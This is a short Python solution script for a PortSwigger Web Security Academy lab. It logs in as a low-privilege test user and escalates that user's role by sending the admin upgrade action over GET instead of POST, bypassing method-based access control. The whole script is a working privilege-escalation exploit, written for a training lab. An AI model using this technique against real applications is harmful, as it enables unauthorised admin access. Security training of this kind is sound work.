"""
https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented
"""

import sys
import requests

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

login_url = f'https://{site}/login'
login_data = { 'password' : 'peter', 'username' : 'wiener'}
resp = s.post(login_url, data=login_data)

upgrade_data = {
    'action' : 'upgrade',
    'username' : 'wiener'
}

url = f'https://{site}/admin-roles'
resp = s.get(url, data = upgrade_data)
print(resp.status_code)
print(resp.text)